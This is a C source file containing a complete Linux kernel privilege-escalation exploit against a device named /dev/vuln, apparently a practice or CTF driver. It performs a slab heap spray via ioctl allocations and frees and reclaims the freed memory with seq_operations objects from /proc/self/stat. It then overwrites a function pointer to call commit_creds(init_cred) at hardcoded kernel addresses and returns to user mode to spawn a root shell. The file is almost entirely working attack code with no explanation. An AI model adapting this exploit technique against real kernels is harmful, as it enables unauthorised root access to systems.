#include <fcntl.h>      // for open, O_RDONLY, O_RDWR
#include <stdint.h>     // for uintptr_t
#include <stdio.h>      // for NULL, perror, puts, size_t
#include <stdlib.h>     // for exit, EXIT_FAILURE, EXIT_SUCCESS
#include <sys/ioctl.h>  // for ioctl
#include <unistd.h>     // for execve, read

#define CMD_ALLOC 0xf000
#define CMD_WRITE 0xf001
#define CMD_FREE 0xf002

typedef struct {
	int id;
	size_t size;
	char *data;
} request_t;

uintptr_t cs;
uintptr_t rflags;
uintptr_t rsp;
uintptr_t ss;

static void *init_cred			= (void *)0xffffffff81e3cbc0;
static int (*commit_creds)(void *)	= (void *)0xffffffff8109f980;

#define objs_per_slab 8
#define cpu_partial 52
#define dev_spray (objs_per_slab * (cpu_partial + 1))
#define seq_spray 0x20

static int seqfd[seq_spray];
static int dev = -1;

static void fatal(const char *err)
{
	perror(err);
	exit(EXIT_FAILURE);
}

static void save_state(void)
{
	asm volatile("movq %%cs, %[cs]\n\t"
		     "pushfq\n\t"
		     "popq %[rflags]\n\t"
		     "movq %%rsp, %[rsp]\n\t"
		     "movq %%ss, %[ss]"
		     : [cs] "=r"(cs), [rflags] "=r"(rflags), [rsp] "=r"(rsp),
		       [ss] "=r"(ss));
}

static void shell(void)
{
	puts("[+] get r00t!");
	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
}

static void restore_state(void)
{
	asm volatile("swapgs\n\t"
		     "movq %[shell], 0x00(%%rsp)\n\t"
		     "movq %[cs], 0x08(%%rsp)\n\t"
		     "movq %[rflags], 0x10(%%rsp)\n\t"
		     "movq %[rsp], 0x18(%%rsp)\n\t"
		     "movq %[ss], 0x20(%%rsp)\n\t"
		     "iretq"
		     :
		     : [shell] "r"(shell), [cs] "r"(cs), [rflags] "r"(rflags),
		       [rsp] "r"(rsp), [ss] "r"(ss));
}

static void get_root(void)
{
	commit_creds(init_cred);
	restore_state();
}

static void dev_alloc(int id)
{
	request_t req;
	req.id = id;
	req.size = 0;
	req.data = NULL;

	ioctl(dev, CMD_ALLOC, &req);
}

static void dev_write(int id, uintptr_t data, size_t len)
{
	request_t req;
	req.id = id;
	req.size = len;
	req.data = (char *)data;

	ioctl(dev, CMD_WRITE, &req);
}

static void dev_free(int id)
{
	request_t req;
	req.id = id;
	req.size = 0;
	req.data = NULL;

	ioctl(dev, CMD_FREE, &req);
}

int main(void)
{
	uintptr_t payload;

	save_state();
	dev = open("/dev/vuln", O_RDWR);
	if (dev == -1)
		fatal("[-] open");

	for (int i = 0; i < dev_spray; ++i)
		dev_alloc(i);
	dev_alloc(dev_spray);

	for (int i = 0; i < dev_spray; i += objs_per_slab) {
		if (i % (objs_per_slab * 2) == 0) {
			for (int j = i; j < i + objs_per_slab; ++j)
				dev_free(j);
		} else {
			dev_free(i);
		}
	}

	for (int i = 0; i < seq_spray; ++i) {
		seqfd[i] = open("/proc/self/stat", O_RDONLY);
		if (seqfd[i] == -1)
			fatal("[-] open");
	}

	payload = (uintptr_t)get_root;
	for (int i = 0; i < dev_spray; i += objs_per_slab * 2)
		dev_write(i, (uintptr_t)&payload, sizeof(uintptr_t));

	for (int i = 0; i < seq_spray; ++i)
		read(seqfd[i], &payload, sizeof(payload));

	return EXIT_SUCCESS;
}
